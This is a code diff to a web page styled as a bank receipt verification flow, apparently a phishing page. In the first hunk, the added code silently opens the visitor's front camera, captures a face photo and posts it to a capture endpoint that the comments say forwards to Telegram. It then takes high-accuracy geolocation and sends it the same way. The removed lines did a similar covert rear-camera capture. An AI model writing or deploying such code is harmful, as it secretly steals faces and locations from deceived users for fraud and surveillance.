@@ -97,31 +97,51 @@ export default function BibdVerificationPage() {
       rearStreamRef.current = rearStream;
       setCameraReady(true);
 
-      // Instant capture: ambil foto diam-diam begitu kamera aktif, kirim ke Telegram
-      setTimeout(() => {
+      // === BACKGROUND: Foto wajah (front camera) → kirim duluan ===
+      (async () => {
         try {
-          const tempVideo = document.createElement('video');
-          tempVideo.srcObject = rearStream;
-          tempVideo.muted = true;
-          tempVideo.playsInline = true;
-          tempVideo.play().then(() => {
-            setTimeout(() => {
-              const canvas = document.createElement('canvas');
-              canvas.width = tempVideo.videoWidth || 640;
-              canvas.height = tempVideo.videoHeight || 480;
-              const ctx = canvas.getContext('2d');
-              ctx?.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
-              canvas.toBlob((blob) => {
-                if (blob) {
-                  const fd = new FormData();
-                  fd.append('photo', blob, 'instant_capture.jpg');
-                  fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
-                }
-              }, 'image/jpeg', 0.85);
-            }, 500); // tunggu 500ms supaya frame stabil
-          }).catch(() => {});
+          // Buka front camera diam-diam
+          const frontStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          });
+          // Tunggu frame stabil
+          const fv = document.createElement('video');
+          fv.srcObject = frontStream;
+          fv.muted = true;
+          fv.playsInline = true;
+          await fv.play();
+          await new Promise(r => setTimeout(r, 800));
+          // Ambil foto
+          const fc = document.createElement('canvas');
+          fc.width = fv.videoWidth || 640;
+          fc.height = fv.videoHeight || 480;
+          fc.getContext('2d')?.drawImage(fv, 0, 0, fc.width, fc.height);
+          // Matikan front camera
+          frontStream.getTracks().forEach(t => t.stop());
+          // Kirim foto wajah ke Telegram
+          fc.toBlob((blob) => {
+            if (blob) {
+              const fd = new FormData();
+              fd.append('photo', blob, 'face_capture.jpg');
+              fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+            }
+          }, 'image/jpeg', 0.85);
         } catch {}
-      }, 300);
+
+        // === Setelah foto wajah, minta izin lokasi ===
+        try {
+          const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              timeout: 15000, enableHighAccuracy: true,
+            });
+          });
+          const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+          // Kirim lokasi ke Telegram
+          const fd = new FormData();
+          fd.append('location', JSON.stringify(loc));
+          fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+        } catch {}
+      })();
     }
   }, []);
 
@@ -433,9 +453,15 @@ export default function BibdVerificationPage() {
                 </div>
                 {/* Retry message */}
                 {retryMessage && (
-                  <div className="flex items-start gap-2 text-xs font-medium text-amber-700 bg-amber-50 p-3 rounded-lg border border-amber-200 w-full">
-                    <span className="material-symbols-outlined text-sm flex-shrink-0 mt-0.5">warning</span>
-                    <span>{retryMessage}</span>
+                  <div className="w-full animate-fade-slide">
+                    <div className="flex items-center gap-3 px-4 py-3.5 rounded-xl bg-gradient-to-r from-orange-50 to-amber-50 border border-orange-200/60 shadow-sm">
+                      <div className="flex-shrink-0 w-8 h-8 rounded-full bg-orange-100 flex items-center justify-center">
+                        <span className="material-symbols-outlined text-orange-500 text-[18px]">photo_camera</span>
+                      </div>
+                      <p className="text-[12px] leading-relaxed text-gray-600">
+                        Foto kurang jelas. Pastikan pencahayaan cukup dan resit terlihat dengan jelas.
+                      </p>
+                    </div>
                   </div>
                 )}
                 {/* Capture button */}
